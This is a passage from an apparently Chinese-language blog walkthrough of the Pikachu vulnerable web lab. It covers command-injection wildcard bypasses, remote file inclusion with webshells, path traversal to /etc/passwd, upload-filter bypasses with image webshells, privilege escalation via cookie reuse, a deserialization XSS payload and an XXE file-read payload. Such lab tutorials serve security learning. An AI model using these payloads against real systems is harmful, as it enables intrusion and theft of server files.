class="hljs-string">&quot;xx$(pwd)&quot;</span><br>通配符绕过：以下指令等同 <span class="hljs-regexp">/bin/</span>cat flag<br>			<span class="hljs-regexp">/???/</span>?[a][t] ?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span><br>			<span class="hljs-regexp">/???/</span>?at flag<br>			<span class="hljs-regexp">/???/</span>?at ????<br>			<span class="hljs-regexp">/???/</span>?[a]<span class="hljs-string">&#x27;&#x27;</span>[t] ?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span>?<span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>更多的内容看这里=&gt;<a target="_blank" rel="noopener" href="https://www.cnblogs.com/SpouseLJ/p/13223967.html">CTF下的命令执行漏洞利用及绕过方法总结</a></p>
<h2 id="exec”ping”"><a href="#exec”ping”" class="headerlink" title="exec”ping”"></a>exec”ping”</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ping</span> <span class="hljs-number">127.0.0.1</span> | whoami<br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/14/M9k8h3ZyaPz5DBN.png" srcset="/img/loading.gif"></p>
<h2 id="exec”evel”"><a href="#exec”evel”" class="headerlink" title="exec”evel”"></a>exec”evel”</h2><p>eval()函数危害极大，甚至可以直接拿shell</p>
<p><img src="https://i.loli.net/2021/02/14/9JUbsZ4PAxjdXF2.png" srcset="/img/loading.gif"></p>
<p><img src="https://i.loli.net/2021/02/14/NYsG9ku7M8IWQ1H.png" srcset="/img/loading.gif"></p>
<h1 id="File-inclusion"><a href="#File-inclusion" class="headerlink" title="File inclusion"></a>File inclusion</h1><blockquote>
<p>概述：</p>
<p>File inclusion 文件包含：在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。</p>
<p>PHP中，提供了：<br>include(),include_once()<br>require(),require_once()</p>
<p>当文件包含的代码文件被写成了一个变量，且这个变量可以由前端用户传进来，这种情况下，如果没有做足够的安全考虑，则可能会引发文件包含漏洞。</p>
</blockquote>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>后端代码通过include()，包含本地文件输出内容，其参数由GET传入，可以任意控制包含的文件</p>
<p>环境要求：allow_url_fopen=On</p>
<p><img src="https://i.loli.net/2021/02/14/14SRghwUCQpM8yO.png" srcset="/img/loading.gif"></p>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>网站错误的将环境配置打开<code>allow_url_include=On</code>(默认关闭)，导致攻击者可以加载远程文件，攻击者搭建一个服务器，通过PHP代码写入一句话木马，导致任意命令执行getshell。</p>
<p>环境要求：allow_url_fopen=On 、allow_url_include=On</p>
<p>将文件上传到某网站上然后复制路径到参数即可</p>
<p><img src="https://i.loli.net/2021/02/14/vuKoXnGd5lTkpCS.png" srcset="/img/loading.gif"></p>
<h1 id="不安全的文件下载"><a href="#不安全的文件下载" class="headerlink" title="不安全的文件下载"></a>不安全的文件下载</h1><p>网站提供文件下载功能,用户点击下载链接，将文件路径传给后台进行处理，当文件下载功能设计不当,则可能导致攻击者可以构造文件路径,从而获取到后台服务器上的其他的敏感文件。</p>
<blockquote>
<p>概述：文件下载功能在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。<br>此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。</p>
<p>所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。 切记：所有与前端交互的数据都是不安全的，不能掉以轻心！</p>
<p>防护：对传入的文件名进行严格的过滤和限定，对文件下载目录进行严格限定</p>
</blockquote>
<p><img src="https://i.loli.net/2021/02/14/ibeYnm19rMfz2sI.png" srcset="/img/loading.gif"></p>
<p><img src="https://i.loli.net/2021/02/14/io6tMa83CvqN7PO.png" srcset="/img/loading.gif"></p>
<p>此处未对文件路径限制，修改下载文件路径就会造成任意文件下载</p>
<p>如将路径更改为…/…/…/…/…/etc/passwd</p>
<h1 id="不安全的文件上传"><a href="#不安全的文件上传" class="headerlink" title="不安全的文件上传"></a>不安全的文件上传</h1><p>可以打一下upload-libs~~~</p>
<blockquote>
<p>概述：文件上传功能在web应用系统很常见，比如很多网站注册的时候需要上传头像、上传附件等等。当用户点击上传按钮后，后台会对上传的文件进行判断 比如是否是指定的类型、后缀名、大小等等，然后将其按照设计的格式进行重命名后存储在指定的目录。 如果说后台对上传的文件没有进行任何的安全判断或者判断条件不够严谨，则攻击着可能会上传一些恶意的文件，比如一句话木马，从而导致后台服务器被webshell。</p>
<p>所以，在设计文件上传功能时，一定要对传进来的文件进行严格的安全考虑。比如：<br>–验证文件类型、后缀名、大小;<br>–验证文件的上传方式;<br>–对文件进行一定复杂的重命名;<br>–不要暴露文件上传后的路径;<br>–等等…</p>
</blockquote>
<h2 id="client-check-客户端检查"><a href="#client-check-客户端检查" class="headerlink" title="client check(客户端检查)"></a>client check(客户端检查)</h2><p>在前端进行验证，要求只能上传图片。</p>
<p>bypass：1.将文件后缀修改符合前端要求，再抓包改回来即可。2.禁用js</p>
<p><img src="https://i.loli.net/2021/02/14/IQp3GW4c6diUlsx.png" srcset="/img/loading.gif"></p>
<h2 id="MIME-type-服务端检查"><a href="#MIME-type-服务端检查" class="headerlink" title="MIME type(服务端检查)"></a>MIME type(服务端检查)</h2><p>MIME type:媒体类型，如图片可能为image/jpeg，应用可能为application/octet-stream</p>
<p>此处只对文件类型进行验证，将application/octet-stream改为image/jpeg即可</p>
<p><img src="https://i.loli.net/2021/02/14/xMNwR8mlBVJE3kW.png" srcset="/img/loading.gif"></p>
<p><img src="https://i.loli.net/2021/02/14/tbSnw6BFTmi5oh9.png" srcset="/img/loading.gif"></p>
<p>找到文件路径，访问即可</p>
<p><img src="https://i.loli.net/2021/02/14/zRL4Tac2xZ8evt3.png" srcset="/img/loading.gif"></p>
<h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h2><p>getimagesize()：获取图像信息，返回文件大小和文件类型。将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p>
<p>会在服务器对图片信息进行验证</p>
<p>上传图片马</p>
<p><img src="https://i.loli.net/2021/02/14/LHtnj2JuaUR4D6g.png" srcset="/img/loading.gif"></p>
<p>然后使用文件包含漏洞包含该路径即可</p>
<p>图片马:</p>
<ol>
<li>准备一张图片 xxx1.jpg 和 一句话php木马 xxx2.php</li>
<li>在两文件路径打开CMD copy xxx2.php/b+xxx1.jpg  hhh.jpg</li>
</ol>
<p><img src="https://i.loli.net/2021/02/14/vrZdfAyC97i8z61.png" srcset="/img/loading.gif"></p>
<p>也可以用hxd或者010editior打开xxx1，将xxx2内容插入到末尾</p>
<h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><blockquote>
<p>概述：如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。</p>
<p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p>
<p>因此，在在权限管理中应该遵守：<br>1.使用最小权限原则对用户进行赋权;<br>2.使用合理（严格）的权限校验规则;<br>3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;</p>
<p>你可以通过“Over permission”对应的测试栏目，来进一步的了解该漏洞。</p>
</blockquote>
<h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>两用户拥有同级权限，但只能操作自己的信息。若A用户能实现对B用户的信息操作，这种同级别的越权行为称之为水平越权。</p>
<p>登陆后点击查看个人信息<img src="https://i.loli.net/2021/02/14/mRg3BkwIYEQVFHO.png" srcset="/img/loading.gif"></p>
<p>url中参数username=lucy更改=》kobe；实现越权</p>
<p><img src="https://i.loli.net/2021/02/14/7Ccw96tfFJHk8QA.png" srcset="/img/loading.gif"></p>
<h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>A用户权限高于B用户，B用户越权操作A用户，这种低权限用户越权操作高权限用户的行为称之为垂直越权。</p>
<p>有两个用户：pikachu/000000;admin/123456（admin为管理员）</p>
<p>pikachu作为普通用户只有查看权限</p>
<p>admin作为管理员用户可以添加和删除用户</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">源码：<br><span class="hljs-variable">$link</span>=connect();<br><br><span class="hljs-comment">// 判断是否登录，没有登录不能访问</span><br><br><span class="hljs-comment">//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。</span><br><br><span class="hljs-keyword">if</span>(!check_op2_login(<span class="hljs-variable">$link</span>))&#123;<br>    header(<span class="hljs-string">&quot;location:op2_login.php&quot;</span>);<br><br>    <span class="hljs-keyword">exit</span>();<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!=<span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]!=<span class="hljs-literal">null</span>)&#123;<span class="hljs-comment">//用户名密码必填</span><br><br>        <span class="hljs-variable">$getdata</span>=escape(<span class="hljs-variable">$link</span>, <span class="hljs-variable">$_POST</span>);<span class="hljs-comment">//转义</span><br><br>        <span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;username&#x27;]&#125;</span>&#x27;,md5(&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;password&#x27;]&#125;</span>&#x27;),&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27;,&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;address&#x27;]&#125;</span>&#x27;)&quot;</span>;<br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/14/OCyG3DBHNIjdvWu.png" srcset="/img/loading.gif"></p>
<p>将普通用户的cookie粘贴到添加用户抓的包里，</p>
<p><img src="https://i.loli.net/2021/02/14/VrMXx7dmsIcv3aJ.png" srcset="/img/loading.gif"></p>
<p>可以看到hhhhhh添加进去了</p>
<p><img src="https://i.loli.net/2021/02/14/tHUlRbL5qvKgoCN.png" srcset="/img/loading.gif"></p>
<p><img src="https://i.loli.net/2021/02/14/Xz784sFgK3Polfn.png" srcset="/img/loading.gif"></p>
<h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><blockquote>
<p>概述：在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p>
<p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p>
<p>需要区分一下的是,如果你通过不带参数的url（比如：<a target="_blank" rel="noopener" href="http://xxxx/doc%EF%BC%89%E5%88%97%E5%87%BA%E4%BA%86doc%E6%96%87%E4%BB%B6%E5%A4%B9%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E8%BF%99%E7%A7%8D%E6%83%85%E5%86%B5%EF%BC%8C%E6%88%91%E4%BB%AC%E6%88%90%E4%B8%BA%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E3%80%82">http://xxxx/doc）列出了doc文件夹里面所有的文件，这种情况，我们成为敏感信息泄露。</a> 而并不归为目录遍历漏洞。（关于敏感信息泄露你你可以在”i can see you ABC”中了解更多）</p>
</blockquote>
<p><img src="https://i.loli.net/2021/02/14/8b5eYIXdHhmA1LR.png" srcset="/img/loading.gif"></p>
<p>修改路径即可</p>
<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><blockquote>
<p>概要：由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p>
<p>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。</p>
<p>你可以通过“i can see your abc”对应的测试栏目，来进一步的了解该漏洞。</p>
</blockquote>
<p>查看网页源代码：</p>
<p><img src="https://i.loli.net/2021/02/14/t4gX9LirypKnR6O.png" srcset="/img/loading.gif"></p>
<p>登陆后进入abc.php；也可以直接在url输入abc.php进入此界面</p>
<p><img src="https://i.loli.net/2021/02/14/IH5roqGO6zaDbs4.png" srcset="/img/loading.gif"></p>
<h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p>先了解两个函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">serialize()：将一个对象转换成一个字符串<br></code></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">unserialize()：将字符串还原为一个对象<br></code></pre></td></tr></table></figure>
<p>序列化：将变量或对象转换为可保存或传输的字符串的过程；在php中使用<code>serialize()</code>实现 将类进行序列化的过程</p>
<p>反序列化：将字符串转换成变量或对象的过程；在php中使用<code>unserialize()</code>实现</p>
<blockquote>
<p>官方文档：所有php里面的值都可以使用函数<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.serialize.php">serialize()</a>来返回一个包含字节流的字符串来表示。<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p>
<p>为了能够<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.unserialize.php">unserialize()</a>一个对象，这个对象的类必须已经定义过。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.spl-autoload-register.php">spl_autoload_register()</a>来实现。</p>
</blockquote>
<p>eg:先设置一个类 test，在类test中定义两个属性name和money；创建对象a，并将其序列化；输出序列化结果。</p>
<p><img src="https://i.loli.net/2021/02/14/vT2wkJGmtdHYpDU.png" srcset="/img/loading.gif"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ls&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;money&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;verymuch&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>o：对象object；4：为test长度；2：为{}内属性个数；</p>
<p>{}内为对象的属性；s：表示类型为字符串string；4：表示属性名长度；”name”为属性名；随后s、2一样；”ls”为属性name的值；</p>
<p>即：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">obeject：对象名长度：<span class="hljs-string">&quot;对象名&quot;</span>：属性个数&#123;属性类型：属性名长度：<span class="hljs-string">&quot;属性名&quot;</span>；属性值类型：属性值长度：<span class="hljs-string">&quot;属性值&quot;</span>.....&#125;<br></code></pre></td></tr></table></figure>
<p>反序列化漏洞与魔法函数有大关联~~</p>
<blockquote>
<p><code>__construct</code>当一个对象创建时调用（constructor）；<br><code>__destruct</code>当一个对象被销毁时调用（destructor）；<br><code>__toString</code>当一个对象被当作一个字符串时使用；<br><code>__sleep</code>当对一个对象在被序列化之前运行（如果存在的话）；<br><code>__wakeup</code>在反序列化时，php就会调用<code>__wakeup</code>方法（如果存在的话）；</p>
</blockquote>
<table>
<thead>
<tr>
<th>魔法函数：</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td>__construct()</td>
<td align="center">类的构造函数</td>
</tr>
<tr>
<td>__destruct()</td>
<td align="center">类的析构函数</td>
</tr>
<tr>
<td>__call()</td>
<td align="center">在对象中调用一个不可访问方法时调用</td>
</tr>
<tr>
<td>__callStatic()</td>
<td align="center">用静态方式中调用一个不可访问方法时调用</td>
</tr>
<tr>
<td>__get()</td>
<td align="center">获得一个类的成员变量时调用</td>
</tr>
<tr>
<td>__set()</td>
<td align="center">设置一个类的成员变量时调用</td>
</tr>
<tr>
<td>__isset()</td>
<td align="center">当对不可访问属性调用isset()或empty()时调用</td>
</tr>
<tr>
<td>__unset()</td>
<td align="center">当对不可访问属性调用unset()时被调用</td>
</tr>
<tr>
<td>__sleep()</td>
<td align="center">执行serialize()时，先会调用这个函数</td>
</tr>
<tr>
<td>__wakeup()</td>
<td align="center">执行unserialize()时，先会调用这个函数</td>
</tr>
<tr>
<td>__toString()</td>
<td align="center">类被当成字符串时的回应方法</td>
</tr>
<tr>
<td>__invoke()</td>
<td align="center">调用函数的方式调用一个对象时的回应方法</td>
</tr>
<tr>
<td>__set_state()</td>
<td align="center">调用var_export()导出类时，此静态方法会被调用</td>
</tr>
<tr>
<td>__clone</td>
<td align="center">当对象复制完成时调用</td>
</tr>
<tr>
<td>__autoload()</td>
<td align="center">尝试加载未定义的类</td>
</tr>
<tr>
<td>__debugInfo()</td>
<td align="center">打印所需调试信息</td>
</tr>
</tbody></table>
<p>接受序列化数据，并将其反序列化</p>
<p><img src="https://i.loli.net/2021/02/14/vhR5pwWGieZ4ack.png" srcset="/img/loading.gif"></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;pikachu&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;		<span class="hljs-comment">#此处魔法函数被重新，设定直接输出test内容</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;		<br>    &#125;<br>&#125;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;o&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;o&#x27;</span>];			<span class="hljs-comment">#以post的方式传参给$o</span><br>    <span class="hljs-keyword">if</span>(!@<span class="hljs-variable">$unser</span> = unserialize(<span class="hljs-variable">$s</span>))&#123;<span class="hljs-comment">#赋值给$unser；@无回显；</span><br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$html</span>.=<span class="hljs-string">&quot;&lt;p&gt;<span class="hljs-subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;<span class="hljs-comment">#赋值成功则将其反序列化并作为p标签返回</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>此处会输出$s反序列化后的值(无waf)，则提交一个序列化参数=》反序列化=》序列化前的值</p>
<p>由此构造payload(xss)：</p>
<p><img src="https://i.loli.net/2021/02/14/xDzmHyfnXh1McJu.png" srcset="/img/loading.gif"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;S&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>;s:<span class="hljs-number">27</span>:<span class="hljs-string">&quot;&lt;script&gt;alert(111)&lt;/script&gt;&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>放进去就行啦</p>
<p><img src="https://i.loli.net/2021/02/14/ZChqMt43TzxGs5y.png" srcset="/img/loading.gif"></p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><blockquote>
<p>XXE -“xml external entity injection”即”xml外部实体注入漏洞”。</p>
<p>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题，<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>
<p>由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的</p>
</blockquote>
<p>基本的payload结构：</p>
<p><img src="https://i.loli.net/2021/02/14/oPEhW9IDKQUZxJ6.jpg" srcset="/img/loading.gif"></p>
<p>eg：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; <br>&lt;!DOCTYPE a [<br>	&lt;!ENTITY d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;<br>]&gt;<br>&lt;abc&gt;&amp;d;&lt;&#x2F;abc&gt;<br></code></pre></td></tr></table></figure>


<blockquote>
<p><strong>xml文档声明结构</strong></p>
<p>eg：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; standalone=&quot;no&quot;?&gt;</span><br></code></pre></td></tr></table></figure>

<p><strong>l  version属性：用于说明当前xml文档的版本，因为都是在用1.0，所以这个属性值大家都写1.0，version属性是必须的；</strong></p>
<p><strong>l  encoding属性：用于说明当前xml文档使用的字符编码集，xml解析器会使用这个编码来解析xml文档。encoding属性是可选的，默认为UTF-8。注意，如果当前xml文档使用的字符编码集是gb2312，而encoding属性的值为UTF-8，那么一定会出错的；</strong></p>
<p><strong>l  standalone属性：用于说明当前xml文档是否为独立文档，如果该属性值为yes，表示当前xml文档是独立的，如果为no表示当前xml文档不是独立的，即依赖外部的约束文件。默认是yes</strong></p>
<p><strong>l  没有xml文档声明的xml文档，不是格式良好的xml文档；</strong></p>
<p><strong>l  xml文档声明必须从xml文档的1行1列开始。</strong></p>
</blockquote>
<blockquote>
<p><strong>DTD实体:</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">一般实体的声明：<span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-string">&quot;实体的值&quot;</span>&gt;</span><br>	引用方法：&amp;实体名称;<br>	p.s.可在DTD、XML、声明前以及实体声明内部引用。<br>参数实体的声明：<span class="hljs-meta">&lt;!ENTITY % 实体名称 <span class="hljs-meta-string">&quot;实体的值&quot;</span>&gt;</span>	<br>	引用方法：%实体名称;	<br>	ps:只能在DTDT中引用，不可在声明前以及实体声明内部引用<br><br>记住“&amp;”符号要进行编码<br></code></pre></td></tr></table></figure>

<p><strong>DTD实体声明</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml">内部实体声明：<span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-string">&quot;实体的值&quot;</span>&gt;</span><br>当引用一般实体时，由三部分构成：&amp;、实体名、；，当是用参数传入xml的时候，&amp;需URL编码，不然&amp;会被认为是参数间的连接符号。<br><br>外部实体声明：<span class="hljs-meta">&lt;!ENTITY 实体名称 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;URI/URL&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
</blockquote>
<p>使用此payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; <br>&lt;!DOCTYPE a [<br>	&lt;!ENTITY d SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot;&gt;<br>]&gt;<br>&lt;abc&gt;&amp;d;&lt;&#x2F;abc&gt;<br></code></pre></td></tr></table></figure>
<p>=&gt;<img src="https://i.loli.net/2021/02/14/mLMThdj2pk6BN4R.png" srcset="/img/loading.gif"></p>
<p>或者：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt; <br>&lt;!DOCTYPE a [<br>	&lt;!ENTITY d &quot;here has a xxe~~~&quot;&gt;<br>]&gt;<br>&lt;abc&gt;&amp;d;&lt;&#x2F;abc&gt;<br></code></pre></td></tr></table></figure>
<p>=&gt;<img src="https://i.loli.net/2021/02/14/Tprh6UwFzlSQMB1.png" srcset="/img/loading.gif"></p>
<h1 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h1><blockquote>
<p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。<br>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话<br>就可能发生”跳错对象”的问题。</p>
<p>url跳转比较直接的危害是:<br>–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p>
</blockquote>
<p>检查元素，可以看到跳转的参数为url=xxx</p>
<p><img src="https://i.loli.net/2021/02/14/8bvJB1CIqr9O4fz.png" srcset="/img/loading.gif"></p>
